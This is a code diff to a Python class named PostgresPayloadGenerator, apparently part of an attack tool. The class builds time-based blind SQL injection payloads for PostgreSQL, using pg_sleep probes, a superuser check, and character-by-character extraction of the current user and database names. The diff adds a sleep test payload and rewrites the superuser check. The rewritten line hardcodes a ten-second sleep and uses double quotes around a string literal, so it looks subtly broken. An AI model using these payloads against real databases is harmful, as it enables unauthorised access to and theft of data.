@@ -12,6 +12,10 @@ class PostgresPayloadGenerator:
     def set_sleep_time(self, seconds: int):
         """Set the sleep time for time-based attacks"""
         self.sleep_time = seconds
+    
+    def test_payload(self) -> str:
+        """Generate a simple sleep payload to test for SQL injection"""
+        return f"select pg_sleep({self.sleep_time});"
 
     def current_user_payload(self, char_pos: int, char: str) -> str:
         """Generate payload to extract current database user"""
@@ -26,9 +30,7 @@ class PostgresPayloadGenerator:
 
     def superuser_check_payload(self) -> str:
         """Generate payload to check if current user is superuser"""
-        return f"AND (SELECT CASE WHEN (SELECT usesuper FROM pg_user " \
-               f"WHERE usename = current_user) THEN pg_sleep({self.sleep_time}) " \
-               f"ELSE pg_sleep(0) END)--"
+        return f'SELECT case when (SELECT current_setting("is_superuser"))="on" then pg_sleep(10) end;--'
 
     def database_enum_payload(self, char_pos: int, char: str) -> str:
         """Generate payload to enumerate database names"""
